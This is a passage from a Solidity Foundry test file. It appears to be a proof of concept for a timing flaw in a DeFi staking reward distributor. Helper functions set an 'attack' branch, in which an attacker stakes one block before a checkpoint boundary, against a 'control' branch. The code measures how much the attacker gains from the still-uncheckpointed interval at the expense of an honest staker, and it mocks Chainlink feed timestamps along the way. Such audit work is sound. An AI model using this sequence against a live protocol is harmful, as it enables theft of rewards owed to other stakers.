   596|        _stakeToken(attacker, USDC, USDC_POOL, amount);
   597|        assertEq(
   598|            distributor.rewardPoolLastCalculatedTimestamp(POOL_ID),
   599|            checkpointBefore,
   600|            "USDC entry unexpectedly settled historical interval"
   601|        );
   602|        vm.warp(boundary + NEXT_BLOCK_SECONDS);
   603|        _refreshChainlinkTimestamps(distributor);
   604|        distributor.distributeRewards(POOL_ID);
   605|        uint256 rate = _currentPoolRateFor(USDC_POOL, distributor);
   606|        result.attackerReward = USDC_POOL.getLatestUserReward(POOL_ID, attacker);
   607|        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
   608|    }
   609|
   610|    function _runLiveControl(
   611|        IDistributorCheckpoint distributor,
   612|        uint256 boundary,
   613|        uint256 initialRate,
   614|        uint256 incumbentVirtualWeight
   615|    ) private returns (LiveBranchResult memory result) {
   616|        vm.warp(boundary + NEXT_BLOCK_SECONDS);
   617|        _refreshChainlinkTimestamps(distributor);
   618|        distributor.distributeRewards(POOL_ID);
   619|        _stake(attacker, LIVE_AMOUNT);
   620|        uint256 rate = _currentPoolRate(distributor);
   621|        result.attackerReward = WETH_POOL.getLatestUserReward(POOL_ID, attacker);
   622|        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
   623|    }
   624|
   625|    function _runLiveAttack(
   626|        IDistributorCheckpoint distributor,
   627|        uint256 boundary,
   628|        uint256 initialRate,
   629|        uint256 incumbentVirtualWeight
   630|    ) private returns (LiveBranchResult memory result) {
   631|        vm.warp(boundary - NEXT_BLOCK_SECONDS);
   632|        _stake(attacker, LIVE_AMOUNT);
   633|        vm.warp(boundary + NEXT_BLOCK_SECONDS);
   634|        _refreshChainlinkTimestamps(distributor);
   635|        distributor.distributeRewards(POOL_ID);
   636|        uint256 rate = _currentPoolRate(distributor);
   637|        result.attackerReward = WETH_POOL.getLatestUserReward(POOL_ID, attacker);
   638|        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
   639|    }
   640|
   641|    function _runControl(
   642|        IDistributorCheckpoint distributor,
   643|        uint256 boundary
   644|    ) private returns (BranchResult memory result) {
   645|        vm.warp(boundary + NEXT_BLOCK_SECONDS);
   646|        _refreshChainlinkTimestamps(distributor);
   647|
   648|        uint256 distributedBefore = distributor.getDistributedRewards(POOL_ID, address(WETH_POOL));
   649|        distributor.distributeRewards(POOL_ID);
   650|        uint256 distributedAfter = distributor.getDistributedRewards(POOL_ID, address(WETH_POOL));
   651|        result.wethPoolRewardDelta = distributedAfter - distributedBefore;
   652|        (,, result.totalVirtualAtSettlement) = WETH_POOL.rewardPoolsData(POOL_ID);
   653|
   654|        _stake(attacker, AMOUNT);
   655|        result.attackerReward = WETH_POOL.getLatestUserReward(POOL_ID, attacker);
   656|        result.honestReward = WETH_POOL.getLatestUserReward(POOL_ID, honest);
   657|    }
   658|
   659|    function _runAttack(
   660|        IDistributorCheckpoint distributor,
   661|        uint256 boundary
   662|    ) private returns (BranchResult memory result) {
   663|        // Stake one normal Ethereum slot before checkpoint eligibility. This removes any
   664|        // dependence on the exact equality boundary: the core bug is mutable stake weight
   665|        // during the still-uncheckpointed interval.
   666|        vm.warp(boundary - NEXT_BLOCK_SECONDS);
   667|        uint128 lastBefore = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
   668|        _stake(attacker, AMOUNT);
   669|        uint128 lastAfterStake = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
   670|        assertEq(lastAfterStake, lastBefore, "boundary unexpectedly checkpointed");
   671|        assertEq(WETH_POOL.getLatestUserReward(POOL_ID, attacker), 0, "reward existed before checkpoint");
   672|
   673|        vm.warp(boundary + NEXT_BLOCK_SECONDS);
   674|        _refreshChainlinkTimestamps(distributor);
   675|        uint256 distributedBefore = distributor.getDistributedRewards(POOL_ID, address(WETH_POOL));
   676|        distributor.distributeRewards(POOL_ID);
   677|        uint256 distributedAfter = distributor.getDistributedRewards(POOL_ID, address(WETH_POOL));
   678|        result.wethPoolRewardDelta = distributedAfter - distributedBefore;
   679|        (,, result.totalVirtualAtSettlement) = WETH_POOL.rewardPoolsData(POOL_ID);
   680|
   681|        result.attackerReward = WETH_POOL.getLatestUserReward(POOL_ID, attacker);
   682|        result.honestReward = WETH_POOL.getLatestUserReward(POOL_ID, honest);
   683|    }
   684|
   685|    function _stake(address user, uint256 amount) private {
   686|        _stakeToken(user, WETH, WETH_POOL, amount);
   687|    }
   688|
   689|    function _stakeToken(
   690|        address user,
   691|        IERC20Checkpoint token,
   692|        IDepositPoolCheckpoint pool,
   693|        uint256 amount
   694|    ) private {
   695|        _stakeTokenWithOptions(user, token, pool, amount, 0, address(0));
   696|    }
   697|
   698|    function _stakeTokenWithOptions(
   699|        address user,
   700|        IERC20Checkpoint token,
   701|        IDepositPoolCheckpoint pool,
   702|        uint256 amount,
   703|        uint128 claimLockEnd,
   704|        address referrer
   705|    ) private {
   706|        deal(address(token), user, amount);
   707|        vm.startPrank(user);
   708|        (bool approved, bytes memory approvalData) = address(token).call(
   709|            abi.encodeWithSignature("approve(address,uint256)", pool.distributor(), amount)
   710|        );
   711|        require(approved && (approvalData.length == 0 || abi.decode(approvalData, (bool))), "token approval failed");
   712|        pool.stake(POOL_ID, amount, claimLockEnd, referrer);
   713|        vm.stopPrank();
   714|    }
   715|
   716|    function _currentPoolRate(IDistributorCheckpoint distributor) private view returns (uint256) {
   717|        return _currentPoolRateFor(WETH_POOL, distributor);
   718|    }
   719|
   720|    function _currentPoolRateFor(
   721|        IDepositPoolCheckpoint pool,
   722|        IDistributorCheckpoint distributor
   723|    ) private view returns (uint256) {
   724|        (, uint256 storedRate, uint256 totalVirtual) = pool.rewardPoolsData(POOL_ID);
   725|        (,,,, uint256 accountedRewards) = pool.rewardPoolsProtocolDetails(POOL_ID);
   726|        uint256 newlyDistributed = distributor.getDistributedRewards(POOL_ID, address(pool)) - accountedRewards;
   727|        if (totalVirtual == 0) return storedRate;
   728|        return storedRate + (newlyDistributed * RATE_PRECISION) / totalVirtual;
   729|    }
   730|
   731|    function _refreshChainlinkTimestamps(IDistributorCheckpoint distributor) private {
   732|        address clConsumer = distributor.chainLinkDataConsumer();
   733|
   734|        for (uint256 i = 0; ; i++) {
   735|            address poolAddr;
   736|            try distributor.depositPoolAddresses(POOL_ID, i) returns (address a) {
   737|                poolAddr = a;
   738|            } catch {
   739|                break;
   740|            }
   741|
   742|            (, string memory path,,,,,,) = distributor.depositPools(POOL_ID, poolAddr);
   743|            bytes32 pathId = keccak256(bytes(path));
   744|
   745|            for (uint256 k = 0; ; k++) {
   746|                (bool okFeed, bytes memory feedResult) = clConsumer.staticcall(
   747|                    abi.encodeWithSignature("dataFeeds(bytes32,uint256)", pathId, k)
   748|                );
   749|                if (!okFeed || feedResult.length < 32) break;
   750|
   751|                address feed = abi.decode(feedResult, (address));
   752|                if (feed == address(0)) break;
   753|
   754|                (bool okRound, bytes memory roundResult) = feed.staticcall(
   755|                    abi.encodeWithSignature("latestRoundData()")
   756|                );
   757|                require(okRound && roundResult.length >= 160, "feed read failed");
   758|
   759|                (uint80 roundId, int256 answer,,, uint80 answeredInRound) =
   760|                    abi.decode(roundResult, (uint80, int256, uint256, uint256, uint80));
   761|                require(answer > 0, "invalid real feed answer");
   762|
   763|                vm.mockCall(
   764|                    feed,
   765|                    abi.encodeWithSignature("latestRoundData()"),
   766|                    abi.encode(roundId, answer, block.timestamp, block.timestamp, answeredInRound)
   767|                );
   768|            }
   769|        }
   770|    }
   771|}
   772|